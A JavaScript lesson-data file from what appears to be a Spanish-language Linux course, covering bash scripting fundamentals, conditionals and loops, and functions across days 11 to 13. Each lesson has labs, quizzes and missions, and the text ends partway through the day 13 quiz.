/* ============================================================
   days11to20.js — Contenido completo Días 11 al 20
   ============================================================ */
import { condCmd, condDir, condFile, condCwd, condFlag, condAll, condAny } from '../utils/missionEvaluator.js'

export const days11to20 = [

// ─────────────────────────────────────────────────────────────
// DÍA 11 — Scripts Bash: Fundamentos
// ─────────────────────────────────────────────────────────────
{
  day: 11, title: 'Scripts Bash: Fundamentos',
  category: 'bash', xp: 400,
  tags: ['bash', 'scripts', 'shebang', 'variables', 'automatización'],
  objectives: [
    'Crear y ejecutar scripts bash',
    'Usar el shebang y permisos de ejecución',
    'Trabajar con argumentos posicionales ($1, $2, $@)',
    'Usar variables locales y globales',
    'Escribir scripts de automatización básicos',
  ],
  theory: {
    intro: 'Un script bash es un archivo de texto con comandos que se ejecutan secuencialmente. La automatización con scripts es la habilidad que multiplica tu productividad: lo que harías en 30 minutos manualmente, un script lo hace en segundos.',
    sections: [
      {
        type: 'dual',
        technical: 'Un script bash es interpretado por el proceso bash (no compilado). El shebang #!/bin/bash en la primera línea especifica el intérprete vía execve(). Los argumentos posicionales se almacenan en $0 (nombre del script), $1..$n (argumentos), $# (cantidad), $@ (todos los argumentos como lista), $* (todos como string).',
        simple: 'Un script bash es como una receta de cocina: una lista de pasos que el sistema ejecuta en orden. El shebang es como escribir "receta para horno" al principio: le dice al sistema cómo ejecutarla.',
      },
      {
        type: 'text',
        title: 'Estructura de un script bash',
        body: '#!/bin/bash — shebang (primera línea obligatoria). # comentarios — documentación. variables=valor — sin espacios alrededor del =. $variable — expandir el valor. echo "mensaje" — mostrar en pantalla. exit 0 — terminar con éxito (exit 1+ = error).',
      },
      {
        type: 'text',
        title: 'Argumentos posicionales',
        body: 'Cuando ejecutas ./script.sh arg1 arg2: $0=./script.sh, $1=arg1, $2=arg2, $#=2 (cantidad de argumentos), $@=arg1 arg2 (todos los argumentos). Esto permite scripts reutilizables que reciben parámetros diferentes cada vez.',
      },
      {
        type: 'note',
        label: 'Scripts en ciberseguridad',
        body: 'Los scripts bash son la herramienta de automatización más usada en seguridad: scripts de hardening que configuran firewalls, scripts de auditoría que buscan vulnerabilidades, scripts de monitoreo que alertan sobre anomalías. Kali Linux incluye cientos de scripts bash como herramientas.',
      },
    ],
    diagram: {
      title: 'Estructura de un script bash',
      content: `#!/bin/bash
# Script: backup.sh
# Descripción: Hace backup del home
# Uso: ./backup.sh [destino]

DESTINO=\${1:-"/tmp/backup"}   # Argumento o valor por defecto
FECHA=$(date +%Y%m%d)         # Sustitución de comando
ARCHIVO="backup_$FECHA.tar"   # Construcción de nombre

echo "Iniciando backup..."
echo "Destino: $DESTINO"
echo "Archivo: $ARCHIVO"

# Comandos del script
tar -czf "$DESTINO/$ARCHIVO" ~/documentos

echo "Backup completado: $ARCHIVO"
exit 0`,
    },
    realCase: {
      title: 'Script de hardening automático en 50 líneas',
      body: 'Los equipos de seguridad usan scripts bash para hardening: deshabilitar servicios innecesarios, configurar el firewall, establecer políticas de contraseñas y activar logging. Un script de 50 líneas puede configurar un servidor seguro en minutos, reemplazando horas de trabajo manual.',
    },
  },
  commands: [
    {
      name: 'bash script.sh',
      brief: 'Ejecutar un script bash directamente',
      technical: 'Invoca bash como intérprete pasando el archivo como argumento. No requiere permisos de ejecución en el script.',
      simple: 'Una forma de ejecutar un script sin necesidad de darle permisos de ejecución primero.',
      syntax: [
        { cmd: 'bash', arg: 'script.sh',              desc: 'Ejecutar con bash' },
        { cmd: 'bash', flag: '-x', arg: 'script.sh',  desc: 'Modo debug: muestra cada comando' },
        { cmd: 'bash', flag: '-n', arg: 'script.sh',  desc: 'Verificar sintaxis sin ejecutar' },
      ],
      errors: [
        { msg: 'bash: script.sh: No such file or directory', fix: 'El script no existe. Verifica la ruta.' },
      ],
      security: 'bash -x script.sh es esencial para depurar scripts de seguridad y entender exactamente qué comandos ejecuta un script sospechoso.',
    },
    {
      name: './script.sh',
      brief: 'Ejecutar script directamente (requiere chmod +x)',
      technical: 'El kernel lee el shebang, invoca el intérprete especificado y pasa el script como argumento. Requiere bit de ejecución.',
      simple: 'La forma habitual de ejecutar scripts. Primero chmod +x script.sh, luego ./script.sh',
      syntax: [
        { cmd: 'chmod +x script.sh && ./script.sh',  desc: 'Dar permiso y ejecutar' },
        { cmd: './script.sh arg1 arg2',              desc: 'Ejecutar con argumentos' },
      ],
      errors: [
        { msg: 'bash: ./script.sh: Permission denied', fix: 'El script no tiene permiso de ejecución. Usa chmod +x script.sh' },
        { msg: '/bin/bash^M: bad interpreter', fix: 'El archivo tiene saltos de línea Windows (CRLF). Usa: sed -i "s/\\r//" script.sh' },
      ],
      security: 'Nunca ejecutes scripts descargados de internet sin revisarlos con cat primero. Un script malicioso puede comprometer tu sistema.',
    },
  ],
  lab: {
    title: 'Crear un script de información del sistema',
    context: 'Cada vez que un nuevo servidor Linux se incorpora a la empresa, necesitas recopilar su información básica. Crea un script que automatice esto.',
    duration: '30 min', xp: 150,
    steps: [
      {
        title: 'Crea el archivo del script',
        body: 'Crea el archivo y añade el shebang.',
        commands: [
          { cmd: 'touch ~/scripts/sysinfo.sh', explanation: 'Crear el archivo del script.' },
          { cmd: 'echo "#!/bin/bash" > ~/scripts/sysinfo.sh', explanation: 'Añadir el shebang como primera línea.' },
        ],
        expected: 'Archivo sysinfo.sh creado con shebang',
        technical: 'El shebang #!/bin/bash en la primera línea le dice al kernel qué intérprete usar. Sin él, el sistema intentará ejecutarlo con sh.',
        hints: ['Crea el archivo con touch, luego añade el shebang con echo >', '$ echo "#!/bin/bash" > ~/scripts/sysinfo.sh'],
      },
      {
        title: 'Añade el cuerpo del script',
        body: 'Agrega comandos para recopilar información del sistema.',
        commands: [
          { cmd: 'echo \'echo "=== INFORMACIÓN DEL SISTEMA ==="\' >> ~/scripts/sysinfo.sh', explanation: 'Añadir título.' },
          { cmd: 'echo \'echo "Hostname: $(hostname)"\' >> ~/scripts/sysinfo.sh', explanation: 'Añadir hostname.' },
          { cmd: 'echo \'echo "Usuario: $(whoami)"\' >> ~/scripts/sysinfo.sh', explanation: 'Añadir usuario.' },
          { cmd: 'echo \'echo "Kernel: $(uname -r)"\' >> ~/scripts/sysinfo.sh', explanation: 'Añadir versión del kernel.' },
          { cmd: 'echo \'echo "Fecha: $(date)"\' >> ~/scripts/sysinfo.sh', explanation: 'Añadir fecha.' },
        ],
        expected: 'Script con 6 líneas',
        technical: 'La sustitución de comandos $() ejecuta el comando y captura su salida en tiempo de ejecución del script.',
        hints: ['Usa >> para añadir líneas al script sin borrar el shebang', '$ echo \'echo "Hostname: $(hostname)"\' >> ~/scripts/sysinfo.sh'],
      },
      {
        title: 'Dale permisos de ejecución',
        body: 'El script necesita permiso de ejecución para poder ejecutarse directamente.',
        commands: [{ cmd: 'chmod +x ~/scripts/sysinfo.sh', explanation: 'Añadir permiso de ejecución.' }],
        expected: '-rwxr-xr-x scripts/sysinfo.sh',
        technical: 'chmod +x añade el bit de ejecución para todos (dueño, grupo, otros). Equivale a chmod 755.',
        hints: ['$ chmod +x ~/scripts/sysinfo.sh'],
      },
      {
        title: 'Verifica el contenido del script',
        body: 'Revisa que el script está bien antes de ejecutarlo.',
        commands: [{ cmd: 'cat ~/scripts/sysinfo.sh', explanation: 'Ver el contenido completo del script.' }],
        expected: '#!/bin/bash\necho "=== INFORMACIÓN DEL SISTEMA ==="\necho "Hostname: $(hostname)"...',
        technical: 'Siempre revisa el contenido de un script antes de ejecutarlo, especialmente si lo descargaste o recibiste de alguien.',
        hints: ['$ cat ~/scripts/sysinfo.sh'],
      },
      {
        title: 'Ejecuta el script',
        body: 'Ejecuta el script y observa la salida.',
        commands: [{ cmd: 'bash ~/scripts/sysinfo.sh', explanation: 'Ejecutar con bash directamente.' }],
        expected: '=== INFORMACIÓN DEL SISTEMA ===\nHostname: linux-academy\nUsuario: estudiante',
        technical: 'bash script.sh no requiere el bit de ejecución. Es útil para probar scripts antes de darles permisos.',
        hints: ['$ bash ~/scripts/sysinfo.sh'],
      },
    ],
    commonErrors: [
      { error: '/bin/bash^M: bad interpreter', solution: 'El script tiene saltos de línea Windows. Créalo directamente en Linux o usa: sed -i "s/\\r//" script.sh' },
      { error: 'Permission denied', solution: 'Olvidaste chmod +x. Ejecuta: chmod +x script.sh' },
    ],
  },
  quiz: [
    { type: 'fill', question: 'La primera línea de todo script bash debe ser: `___/bin/bash`', correct: ['#!/'], explanation: 'El shebang #!/bin/bash indica al kernel el intérprete a usar. Sin él, el sistema puede usar sh en lugar de bash, con comportamiento diferente.' },
    { type: 'multiple', question: '¿Qué variable contiene el número de argumentos pasados a un script?', options: ['$0', '$#', '$@', '$n'], correct: 1, explanation: '$# contiene el número de argumentos. $0 es el nombre del script, $@ son todos los argumentos como lista.' },
    { type: 'true_false', question: '`bash script.sh` requiere que el script tenga permisos de ejecución.', correct: false, explanation: 'bash script.sh invoca bash como intérprete y le pasa el archivo. No requiere el bit de ejecución. Solo ./script.sh lo requiere.' },
    { type: 'multiple', question: '¿Qué hace `bash -x script.sh`?', options: ['Ejecuta el script en modo exclusivo', 'Muestra cada comando antes de ejecutarlo (debug)', 'Ejecuta el script en paralelo', 'Verifica la sintaxis sin ejecutar'], correct: 1, explanation: '-x (xtrace) imprime cada comando antes de ejecutarlo, prefijado con +. Esencial para depurar scripts.' },
    { type: 'multiple', question: 'En un script ejecutado como `./script.sh usuario 30`, ¿qué contiene `$2`?', options: ['./script.sh', 'usuario', '30', 'usuario 30'], correct: 2, explanation: '$1=usuario, $2=30. $0 es el nombre del script, $1 el primer argumento, $2 el segundo.' },
  ],
  missions: [
    { id: 'm1d11', title: 'Crea un archivo .sh', description: 'touch ~/scripts/miscript.sh', hint: '$ touch ~/scripts/miscript.sh', xp: 25, condition: { type: 'file_exists', path: '~/scripts/miscript.sh' } },
    { id: 'm2d11', title: 'Añade el shebang', description: 'echo "#!/bin/bash" > script.sh', hint: '$ echo "#!/bin/bash" > ~/scripts/miscript.sh', xp: 30, condition: { type: 'command_matches', pattern: '#!/bin/bash' } },
    { id: 'm3d11', title: 'Dale chmod +x', description: 'chmod +x al script', hint: '$ chmod +x ~/scripts/miscript.sh', xp: 25, condition: { type: 'command_with_flag', command: 'chmod', flag: '+x' } },
    { id: 'm4d11', title: 'Ejecuta un script con bash', description: 'bash script.sh', hint: '$ bash ~/scripts/sysinfo.sh', xp: 30, condition: condCmd('bash') },
  ],
  resources: [
    { name: 'Bash Scripting Tutorial', url: 'https://bash.cyberciti.biz/guide/Main_Page', icon: '📖' },
    { name: 'Shell Check - Validador', url: 'https://www.shellcheck.net', icon: '✅' },
    { name: 'GNU Bash Manual', url: 'https://www.gnu.org/software/bash/manual/', icon: '📚' },
  ],
},

// ─────────────────────────────────────────────────────────────
// DÍA 12 — Condicionales y Bucles en Bash
// ─────────────────────────────────────────────────────────────
{
  day: 12, title: 'Condicionales y Bucles en Bash',
  category: 'bash', xp: 400,
  tags: ['if', 'for', 'while', 'case', 'condicionales', 'bucles'],
  objectives: [
    'Usar if/elif/else para tomar decisiones',
    'Comparar strings y números en bash',
    'Iterar con bucles for y while',
    'Usar la estructura case para múltiples opciones',
    'Escribir scripts con lógica de control',
  ],
  theory: {
    intro: 'Los condicionales y bucles transforman un script lineal en uno inteligente. Con if puedes tomar decisiones, con for y while puedes procesar listas de archivos o repetir tareas. Esto es lo que convierte un script simple en una herramienta poderosa.',
    sections: [
      {
        type: 'dual',
        technical: 'bash evalúa condiciones usando el comando [ ] (test) o [[ ]] (bash extendido). El código de salida 0 = verdadero, 1+ = falso. Los bucles for iteran sobre listas o secuencias. while evalúa una condición al inicio de cada iteración.',
        simple: 'if es como una pregunta: "¿Es esto verdad? Si sí, haz X. Si no, haz Y." for es como una lista de tareas: "Para cada archivo en esta lista, haz esto." while es como: "Sigue haciendo esto mientras la condición sea verdad."',
      },
      {
        type: 'text',
        title: 'Operadores de comparación',
        body: 'Para números: -eq (igual), -ne (diferente), -lt (menor), -gt (mayor), -le (menor o igual), -ge (mayor o igual). Para strings: = (igual), != (diferente), -z (vacío), -n (no vacío). Para archivos: -f (es archivo), -d (es directorio), -e (existe), -r (legible), -w (escribible), -x (ejecutable).',
      },
      {
        type: 'note',
        label: 'Condicionales en scripts de seguridad',
        body: 'Los scripts de seguridad usan condicionales constantemente: if [ $UID -ne 0 ]; then echo "Necesitas ser root"; exit 1; fi. Este patrón verifica privilegios antes de ejecutar. También: if [ -f /etc/passwd ]; then — verifica que un archivo existe antes de procesarlo.',
      },
    ],
    diagram: {
      title: 'Estructuras de control en bash',
      content: `# Condicional if/elif/else
if [ condición ]; then
    comandos
elif [ otra_condición ]; then
    otros_comandos
else
    comandos_por_defecto
fi

# Bucle for
for variable in lista; do
    comandos con $variable
done

# Bucle while
while [ condición ]; do
    comandos
done

# Case
case $variable in
    patron1) comandos ;;
    patron2) comandos ;;
    *) default ;;
esac`,
    },
    realCase: {
      title: 'Script de backup con verificación de errores',
      body: 'Un script de backup profesional usa if para verificar: ¿existe el directorio destino? ¿hay espacio suficiente? ¿el backup anterior fue exitoso? Sin estas verificaciones, el script podría silenciosamente fallar dejando el sistema sin backup. Los condicionales son la diferencia entre un script amateur y uno de producción.',
    },
  },
  commands: [
    {
      name: 'if [ ] then fi',
      brief: 'Condicional if en bash',
      technical: '[ ] es el comando test. Evalúa la condición y retorna 0 (verdadero) o 1 (falso). [[ ]] es la versión extendida de bash con más características.',
      simple: 'Permite que el script tome decisiones: si algo es verdad, haz una cosa; si no, haz otra.',
      syntax: [
        { cmd: 'if [ "$var" = "hola" ]; then echo "sí"; fi',       desc: 'Comparar strings' },
        { cmd: 'if [ $num -gt 10 ]; then echo "mayor"; fi',        desc: 'Comparar números' },
        { cmd: 'if [ -f archivo.txt ]; then echo "existe"; fi',    desc: 'Verificar si archivo existe' },
        { cmd: 'if [ -d directorio ]; then echo "es dir"; fi',     desc: 'Verificar si es directorio' },
        { cmd: 'if [ $UID -eq 0 ]; then echo "eres root"; fi',    desc: 'Verificar si es root' },
      ],
      errors: [
        { msg: '[: missing ]', fix: 'Falta el espacio antes de ]. Debe ser [ condición ] con espacios.' },
        { msg: 'unexpected token', fix: 'Falta el ; o then después de la condición: if [ cond ]; then' },
      ],
      security: 'if [ $UID -ne 0 ]; then echo "ERROR: Se requiere root"; exit 1; fi — patrón estándar de seguridad en scripts que necesitan privilegios.',
    },
    {
      name: 'for in do done',
      brief: 'Bucle for para iterar sobre listas',
      technical: 'bash expande la lista y asigna cada elemento a la variable de iteración secuencialmente.',
      simple: 'Repite un bloque de comandos para cada elemento de una lista.',
      syntax: [
        { cmd: 'for i in 1 2 3 4 5; do echo $i; done',           desc: 'Iterar sobre lista' },
        { cmd: 'for f in *.txt; do cat $f; done',                 desc: 'Iterar sobre archivos' },
        { cmd: 'for i in $(seq 1 10); do echo $i; done',         desc: 'Iterar con seq' },
        { cmd: 'for user in $(cat /etc/passwd | cut -d: -f1); do echo $user; done', desc: 'Iterar sobre usuarios' },
      ],
      errors: [
        { msg: 'Syntax error: unexpected end of file', fix: 'Falta el "done" al final del bucle.' },
      ],
      security: 'for ip in $(cat ips.txt); do ping -c1 $ip; done — escanea una lista de IPs. Base de herramientas de seguridad como scripts de auditoría.',
    },
    {
      name: 'while do done',
      brief: 'Bucle while que ejecuta mientras la condición sea verdad',
      technical: 'Evalúa la condición antes de cada iteración. Si es 0 (verdadero), ejecuta el cuerpo. Repite hasta que la condición falla.',
      simple: 'Repite un bloque de comandos mientras algo sea verdad.',
      syntax: [
        { cmd: 'while [ $i -lt 10 ]; do echo $i; ((i++)); done', desc: 'Contar hasta 10' },
        { cmd: 'while true; do echo "corriendo"; sleep 1; done', desc: 'Bucle infinito (Ctrl+C para salir)' },
        { cmd: 'while read linea; do echo $linea; done < archivo.txt', desc: 'Leer archivo línea por línea' },
      ],
      errors: [
        { msg: 'Bucle infinito', fix: 'Asegúrate de modificar la variable de condición dentro del bucle o añade un break.' },
      ],
      security: 'while read line; do procesar $line; done < /var/log/auth.log — procesa logs línea por línea. Patrón fundamental en análisis de seguridad.',
    },
  ],
  lab: {
    title: 'Script de auditoría de usuarios con lógica de control',
    context: 'Necesitas un script que audite los usuarios del sistema, verifique cuáles tienen acceso SSH y genere un reporte automático.',
    duration: '35 min', xp: 150,
    steps: [
      {
        title: 'Crea el script base con verificación de root',
        body: 'Todo script de auditoría debe verificar que tiene los privilegios necesarios.',
        commands: [
          { cmd: 'echo \'#!/bin/bash\' > ~/scripts/auditoria.sh', explanation: 'Shebang.' },
          { cmd: 'echo \'echo "=== AUDITORÍA DE USUARIOS ==="\' >> ~/scripts/auditoria.sh', explanation: 'Título.' },
          { cmd: 'echo \'echo "Fecha: $(date)"\' >> ~/scripts/auditoria.sh', explanation: 'Timestamp del reporte.' },
          { cmd: 'chmod +x ~/scripts/auditoria.sh', explanation: 'Permisos de ejecución.' },
        ],
        expected: 'Script base creado',
        technical: 'La verificación de privilegios con if [ $UID -eq 0 ] es el primer patrón que aprende todo sysadmin.',
        hints: ['Crea el script con echo y >>'],
      },
      {
        title: 'Añade un bucle para listar usuarios',
        body: 'Usa un for para procesar cada usuario del sistema.',
        commands: [
          { cmd: "echo 'for user in $(cat /etc/passwd | grep /bin/bash | cut -d: -f1); do' >> ~/scripts/auditoria.sh", explanation: 'Inicio del bucle.' },
          { cmd: "echo '  echo \"Usuario encontrado: $user\"' >> ~/scripts/auditoria.sh", explanation: 'Cuerpo del bucle.' },
          { cmd: "echo 'done' >> ~/scripts/auditoria.sh", explanation: 'Fin del bucle.' },
        ],
        expected: 'Bucle for añadido al script',
        technical: 'cut -d: -f1 extrae el primer campo (nombre de usuario) del formato de /etc/passwd.',
        hints: ['El bucle for itera sobre los usuarios con shell bash'],
      },
      {
        title: 'Ejecuta el script de auditoría',
        body: 'Prueba el script completo.',
        commands: [{ cmd: 'bash ~/scripts/auditoria.sh', explanation: 'Ejecutar el script.' }],
        expected: '=== AUDITORÍA DE USUARIOS ===\nFecha: ...\nUsuario encontrado: root\nUsuario encontrado: estudiante',
        technical: 'El script recorre /etc/passwd filtrando usuarios con /bin/bash y muestra cada uno.',
        hints: ['$ bash ~/scripts/auditoria.sh'],
      },
      {
        title: 'Prueba un condicional básico',
        body: 'Verifica si eres el usuario root.',
        commands: [{ cmd: 'if [ $UID -eq 0 ]; then echo "Eres root"; else echo "No eres root (UID=$UID)"; fi', explanation: 'Condicional inline.' }],
        expected: 'No eres root (UID=1000)',
        technical: '$UID es una variable especial de bash que contiene el UID del usuario actual. 0 = root.',
        hints: ['$ if [ $UID -eq 0 ]; then echo "root"; else echo "no root"; fi'],
      },
      {
        title: 'Usa un bucle while para leer auth.log',
        body: 'Procesa el log de autenticación línea por línea.',
        commands: [{ cmd: 'while read linea; do echo "LOG: $linea"; done < /var/log/auth.log', explanation: 'Lee el archivo línea por línea.' }],
        expected: 'LOG: Jan 15 10:00:01 linux-academy sshd...',
        technical: 'while read es el patrón más eficiente para procesar archivos de texto línea por línea en bash.',
        hints: ['$ while read linea; do echo "LOG: $linea"; done < /var/log/auth.log'],
      },
    ],
    commonErrors: [
      { error: '[: missing ]', solution: 'Los espacios en [ condición ] son obligatorios: [ $VAR -eq 0 ] no [$VAR -eq 0]' },
      { error: 'Syntax error near unexpected token done', solution: 'Falta el ; después de la condición del while o for.' },
    ],
  },
  quiz: [
    { type: 'fill', question: 'Para verificar si un archivo existe en bash: `if [ ___ archivo.txt ]; then`', correct: ['-f', '-e'], explanation: '-f verifica si existe Y es un archivo regular. -e verifica si existe (cualquier tipo).' },
    { type: 'multiple', question: '¿Cómo comparas si la variable $NUM es mayor que 10?', options: ['if [ $NUM > 10 ]', 'if [ $NUM -gt 10 ]', 'if [ $NUM gt 10 ]', 'if ( $NUM > 10 )'], correct: 1, explanation: '-gt (greater than) compara números. > en bash es redirección, no comparación numérica.' },
    { type: 'true_false', question: 'En bash, el código de salida 0 significa verdadero/éxito.', correct: true, explanation: 'Al contrario de muchos lenguajes, en Unix/bash 0=éxito/verdadero y 1+=error/falso. Esto es por convención histórica.' },
    { type: 'multiple', question: '¿Qué estructura usarías para ejecutar código diferente según el valor de una variable con múltiples opciones?', options: ['if/elif con muchos elif', 'for loop', 'case/esac', 'while loop'], correct: 2, explanation: 'case es más legible que múltiples elif cuando hay muchas opciones. Equivale al switch de otros lenguajes.' },
    { type: 'fill', question: 'Para leer un archivo línea por línea: `while ___ linea; do echo $linea; done < archivo`', correct: ['read'], explanation: 'while read linea lee una línea del stdin (redirigido desde el archivo) en cada iteración.' },
  ],
  missions: [
    { id: 'm1d12', title: 'Ejecuta un if condicional', description: 'if [ $UID -eq 0 ]; then...', hint: '$ if [ $UID -eq 0 ]; then echo "root"; else echo "user"; fi', xp: 30, condition: condCmd('if') },
    { id: 'm2d12', title: 'Usa un bucle for', description: 'for i in 1 2 3; do echo $i; done', hint: '$ for i in 1 2 3; do echo $i; done', xp: 35, condition: condCmd('for') },
    { id: 'm3d12', title: 'Crea el script auditoria.sh', description: 'Script con shebang en scripts/', hint: '$ touch ~/scripts/auditoria.sh', xp: 25, condition: condFile('~/scripts/auditoria.sh') },
    { id: 'm4d12', title: 'Usa while read para leer auth.log', description: 'while read linea; do...', hint: '$ while read l; do echo $l; done < /var/log/auth.log', xp: 40, condition: condCmd('while') },
  ],
  resources: [
    { name: 'Bash If Statements', url: 'https://linuxize.com/post/bash-if-else-statement/', icon: '📖' },
    { name: 'Bash Loops', url: 'https://www.gnu.org/software/bash/manual/bash.html#Looping-Constructs', icon: '🔄' },
  ],
},

// ─────────────────────────────────────────────────────────────
// DÍA 13 — Funciones y Modularidad en Bash
// ─────────────────────────────────────────────────────────────
{
  day: 13, title: 'Funciones y Modularidad en Bash',
  category: 'bash', xp: 400,
  tags: ['funciones', 'modularidad', 'return', 'local', 'source'],
  objectives: [
    'Definir y llamar funciones en bash',
    'Usar variables locales dentro de funciones',
    'Retornar valores desde funciones',
    'Organizar scripts con funciones reutilizables',
    'Usar source para importar funciones desde otros archivos',
  ],
  theory: {
    intro: 'Las funciones son bloques de código reutilizables. Un script bien organizado con funciones es más fácil de mantener, depurar y reutilizar. Esta es la diferencia entre un script de 50 líneas y uno de 500 líneas que todavía se puede entender.',
    sections: [
      {
        type: 'dual',
        technical: 'En bash, las funciones son comandos definidos por el usuario almacenados en la tabla de funciones del shell. Se invocan igual que los comandos externos. Las variables locales (declaradas con local) tienen scope limitado a la función. return solo puede devolver un entero (0-255); para devolver strings se usa echo + sustitución de comandos.',
        simple: 'Las funciones son como mini-recetas dentro de tu receta principal. En lugar de repetir los mismos pasos 5 veces, los pones en una función con nombre y la llamas 5 veces.',
      },
      {
        type: 'text',
        title: 'Sintaxis de funciones bash',
        body: 'function nombre() { comandos; } o simplemente nombre() { comandos; }. Los argumentos dentro de la función son $1, $2 (locales a la función). local variable=valor declara variables que no contaminan el scope global. Para devolver un string: resultado=$(mi_funcion) captura el echo de la función.',
      },
      {
        type: 'note',
        label: 'Funciones en scripts de seguridad',
        body: 'Los scripts de seguridad bien organizados usan funciones: check_root() verifica privilegios, log_message() estandariza el logging, send_alert() envía notificaciones. Esta modularidad facilita el mantenimiento y la auditoría del propio script de seguridad.',
      },
    ],
    realCase: {
      title: 'Biblioteca de funciones de seguridad compartida',
      body: 'Los equipos de seguridad mantienen archivos de funciones compartidas (security_lib.sh) con funciones como: check_port_open(), is_process_running(), get_active_connections(). Cualquier script del equipo hace source security_lib.sh y usa estas funciones sin reescribirlas. Esto garantiza consistencia y reduce errores.',
    },
  },
  commands: [
    {
      name: 'function() {}',
      brief: 'Definir una función en bash',
      technical: 'Las funciones se registran en la tabla de funciones del shell. Pueden acceder a variables del scope global o declara locales con local.',
      simple: 'Agrupa comandos bajo un nombre para reutilizarlos sin copiar y pegar.',
      syntax: [
        { cmd: 'saludar() { echo "Hola $1"; }', desc: 'Función simple con argumento' },
        { cmd: 'saludar "mundo"', desc: 'Llamar a la función' },
        { cmd: 'resultado=$(mi_funcion)', desc: 'Capturar el output de una función' },
        { cmd: 'local var="valor"', desc: 'Variable local a la función' },
      ],
      errors: [
        { msg: 'command not found: mi_funcion', fix: 'La función debe definirse ANTES de llamarla en el script.' },
      ],
      security: 'Organiza scripts de seguridad con funciones: check_root(), log_alert(), backup_config(). Hace el código auditable.',
    },
    {
      name: 'source',
      brief: 'Importar funciones y variables de otro archivo',
      technical: 'source ejecuta el archivo en el contexto del shell actual (mismo proceso, mismo scope). A diferencia de bash script.sh que crea un subshell.',
      simple: 'Importa funciones de otro archivo bash, como el import de Python o require de JavaScript.',
      syntax: [
        { cmd: 'source ~/scripts/lib.sh',  desc: 'Importar funciones de lib.sh' },
        { cmd: '. ~/scripts/lib.sh',       desc: 'Equivalente con punto (.)' },
      ],
      errors: [
        { msg: 'source: lib.sh: No such file', fix: 'La ruta al archivo es incorrecta.' },
      ],
      security: 'Nunca hagas source de archivos no confiables. source ejecuta TODO el código del archivo en tu shell actual con tus privilegios.',
    },
  ],
  lab: {
    title: 'Biblioteca de funciones para administración del sistema',
    context: 'Crea una biblioteca de funciones reutilizables que cualquier script de tu equipo pueda importar para tareas comunes de administración.',
    duration: '30 min', xp: 150,
    steps: [
      {
        title: 'Crea el archivo de biblioteca',
        body: 'Crea un archivo que contendrá funciones reutilizables.',
        commands: [
          { cmd: 'echo \'#!/bin/bash\n# Biblioteca de funciones de administración\' > ~/scripts/admin_lib.sh', explanation: 'Crear la librería.' },
        ],
        expected: 'admin_lib.sh creado',
        technical: 'Organizar funciones en archivos separados permite reutilización entre scripts sin duplicar código.',
        hints: ['$ echo \'#!/bin/bash\' > ~/scripts/admin_lib.sh'],
      },
      {
        title: 'Define funciones de logging',
        body: 'Añade funciones para mostrar mensajes con formato consistente.',
        commands: [
          { cmd: "cat >> ~/scripts/admin_lib.sh << 'EOF'\nlog_info()  { echo \"[INFO]  $(date +%H:%M:%S) $1\"; }\nlog_error() { echo \"[ERROR] $(date +%H:%M:%S) $1\" >&2; }\nlog_ok()    { echo \"[OK]    $(date +%H:%M:%S) $1\"; }\nEOF", explanation: 'Tres funciones de logging con timestamp.' },
        ],
        expected: 'Tres funciones de log definidas',
        technical: '>&2 redirige a stderr, que es la convención para mensajes de error.',
        hints: ['Usa cat >> con heredoc para añadir las funciones'],
      },
      {
        title: 'Añade función de verificación del sistema',
        body: 'Función que verifica si un proceso está corriendo.',
        commands: [
          { cmd: "cat >> ~/scripts/admin_lib.sh << 'EOF'\ncheck_process() {\n  local proceso=$1\n  if ps aux | grep -q \"[$\{proceso:0:1}]$\{proceso:1}\"; then\n    log_ok \"$proceso está corriendo\"\n    return 0\n  else\n    log_error \"$proceso NO está corriendo\"\n    return 1\n  fi\n}\nEOF", explanation: 'Función que verifica procesos.' },
        ],
        expected: 'Función check_process definida',
        technical: 'El patrón [\${proceso:0:1}]\${proceso:1} en grep evita que grep se encuentre a sí mismo en la lista de procesos.',
        hints: ['Usa cat >> con heredoc'],
      },
      {
        title: 'Prueba las funciones con source',
        body: 'Importa la librería y usa sus funciones.',
        commands: [
          { cmd: 'source ~/scripts/admin_lib.sh', explanation: 'Importar la librería al shell actual.' },
          { cmd: 'log_info "Iniciando auditoría del sistema"', explanation: 'Usar la función de logging.' },
          { cmd: 'log_ok "Sistema verificado correctamente"', explanation: 'Función de éxito.' },
        ],
        expected: '[INFO]  10:23:45 Iniciando auditoría del sistema\n[OK]    10:23:45 Sistema verificado correctamente',
        technical: 'source importa las funciones al shell actual. Después de source, log_info funciona como si fuera un comando del sistema.',
        hints: ['$ source ~/scripts/admin_lib.sh', '$ log_info "mensaje"'],
      },
      {
        title: 'Crea un script que usa la librería',
        body: 'Escribe un script que importe y use las funciones.',
        commands: [
          { cmd: "echo -e '#!/bin/bash\\nsource ~/scripts/admin_lib.sh\\nlog_info \"Script iniciado\"\\nlog_ok \"Revisión completada\"' > ~/scripts/usar_lib.sh", explanation: 'Script que usa la librería.' },
          { cmd: 'bash ~/scripts/usar_lib.sh', explanation: 'Ejecutar el script.' },
        ],
        expected: '[INFO] ... Script iniciado\n[OK] ... Revisión completada',
        technical: 'Este patrón (librería + scripts que la usan) es como se organiza código bash en proyectos reales de DevOps y seguridad.',
        hints: ['Crea el script con source y luego ejecútalo'],
      },
    ],
    commonErrors: [
      { error: 'command not found: log_info', solution: 'Olvidaste hacer source de la librería. Ejecuta: source ~/scripts/admin_lib.sh primero.' },
      { error: 'local: can only be used in a function', solution: 'local solo funciona dentro de funciones. Fuera de ellas, usa variables normales.' },
    ],
  },
  quiz: [
    { type: 'fill', question: 'Para importar funciones de otro archivo bash al shell actual: `___ ~/scripts/lib.sh`', correct: ['source', '. '], explanation: 'source (o su alias .) ejecuta el archivo en el contexto del shell actual, importando funciones y variables.' },
    { type: 'multiple', question: '¿Cómo declaras una variable local dentro de una función bash?', options: ['var variable=valor', 'private variable=valor', 'local variable=valor', 'function variable=valor'], correct: 2, explanation: 'local limita el scope de la variable a la función. Sin local, la variable es global y puede causar efectos secundarios.' },
    { type: 'true_false', question: 'En bash, `return 5` en una función devuelve el string "5" al código que la llamó.', correct: false, explanation: 'return solo devuelve un código de salida (0-255), accesible con $?. Para devolver strings, usa echo dentro de la función y captura con $().' },
    { type: 'multiple', question: '¿En qué se diferencia `source script.sh` de `bash script.sh`?', options: ['No hay diferencia', 'source ejecuta en el shell actual; bash crea un subshell', 'bash es más rápido', 'source requiere chmod +x'], correct: 1, explanation: 'source ejecuta en el proceso actual (comparte variables). bash crea un nuevo proceso hijo (subshell) con scope separado.' },
